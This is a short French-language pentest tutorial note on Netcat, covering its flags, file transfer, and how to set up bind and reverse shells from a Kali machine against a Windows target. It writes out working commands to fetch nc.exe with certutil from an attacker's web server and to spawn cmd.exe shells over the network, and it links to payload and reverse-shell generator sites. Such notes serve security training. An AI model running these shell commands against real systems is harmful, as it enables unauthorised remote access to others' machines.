## Netcat
Utilisé pour le banner grabbing, port scanning, transfer de fichiers et reverse et bind shells.  

-u : UDP ports (par défaut en TCP)  
-l : listening ports  
-n : ne résoud pas les noms DNS, reste en IP  
-e : execute une commande spécifique (bind ou reverse shell)  
-v : verbose  
-p : port local  

### Utilisation de Netcat
`python -m SimpleHTTPServer 80` : crée un serveur HTTP en python sur la machine Kali.  
`certutil -urlcache -f http://IP_Attaquant/nc.exe nc.exe` : télécharger depuis la cible windows netcat sur le serveur web de la machine attaquante.  
`nc -lvnp 1234` : cré un port (1234) en écoute sur machine kali.  
`.\nc -nv ip_attaquant 1234` : depuis machine cible, exécute netcat pour se conneceter sur le port de la machine attaquante. (côté attaquant on est informé).  
Nous sommes ensuite connectés et il est possible d'envoyer du texte en console dans les 2 sens.  

Il est possible d'envoyer des fichiers :  
`nc.exe -nvlp 1234 > test.txt` : machine en écoute qui enverra ce qu'elle reçoit dans un ficher nommé test.txt  
`nc -nv 10.0.27.35 1234 < test.txt` : On se connecte avec l'autre machine, vers la machine en écoute en envoyant dans Netcat le ficher créé apppelé test.txt  

## Bind Shell
Un Bind Shell est un shell où l'attaquant se connecte directement sur la cible. Permettant donc l'exécution de commandes sur la cible. Moins utilisé car plus facilement bloqué par les FW que le reverse shell.    

Mise en pratique :  
Kali Linux est fourni avec l'exécutable nc.exe préinstallé ; nous pouvons héberger cet exécutable en configurant un serveur HTTP avec Python à cet endroit : `cd /usr/share/windows-binaries` puis on lance un serveur web : `python -m SimpleHTTPServer 80`  
Depuis la machine Windows on télécharge Netcat pour windows, soit avec le shell : `certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe`  
soit avec l'interface web (IP + port)  
Lancer netcat en écoute sur la cible Windows : `.\nc.exe -nvlp 1234 -e cmd.exe` ("-e cmd.exe" va lancer un shell cmd à la connexion de l'autre machine).  
Nous pouvons désormais nous connecter au serveur d'écoute Bind exécuté sur le système Windows depuis le système Kali Linux :  `nc -nv 10.0.23.27 1234` : nous obtenons un shell cmd directement à la connxion grâce à "-e cmd.exe" de la victime.    




## Reverse Shell
C'est un remote shell où la victime se connecte sur l'attaquant. Plus efficace car le traffic sortant n'est pas filtré.  
Et pas besoin de paramétrer un listener sur la victime (ça sera l'attaquant qui sera en attente).  
Même principe qu'en bind pour DL nc.exe sur Windows.  
Ici, c'est l'attaquant qui écoute : `nc -nvlp 1234`  
La cible se connecte : `./nc.exe -nv <Kali_Machine_IP_address> 1234 -e cmd.exe` : elle lance un cmd sur la machine en écoute.  




## Ressources  

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources  


Reverse generator :  
https://www.revshells.com/  
